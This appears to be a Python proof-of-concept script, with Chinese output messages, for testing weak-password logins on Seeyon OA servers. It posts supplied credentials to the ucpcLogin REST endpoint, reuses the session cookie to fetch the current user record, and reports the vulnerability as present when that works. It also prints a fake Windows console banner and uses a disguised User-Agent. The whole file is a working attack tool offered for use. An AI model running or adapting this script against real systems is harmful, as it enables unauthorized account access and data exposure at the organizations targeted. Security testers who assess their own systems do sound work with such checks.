#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib3

urllib3.disable_warnings()

def verify(site, username, password):
    burp0_url = site +"/seeyon/rest/authentication/ucpcLogin?login_username="+username+"&login_password="+password+"&ticket="
    burp0_headers = {"User-Agent": "Cozilla/5.0 (Vindows Et 6.1; Sow64, rident/7.0; ry: 11.0)"}
    r = requests.post(burp0_url, headers=burp0_headers, verify=False)
    if "Set-Cookie" in r.headers:
        burp0_headers["Cookie"] = r.headers["Set-Cookie"]
        burp0_url2 = site + "/seeyon/rest/m3/login/getCurrentUser"
        burp0_json={"": ""}
        r2 = requests.post(burp0_url2, headers=burp0_headers, json=burp0_json, verify=False)
        if r2.status_code==200 and "currentMember" in r2.text:
            return r2.text
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    username = sys.argv[2]
    password = sys.argv[3]
    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 seeyon-weak-pass-login.py ",target)
    data = verify(target, username, password)
    if data != "":
        print("[+]漏洞存在，当前认证的用户为：", data)
    else:
        print("[-]漏洞不存在")
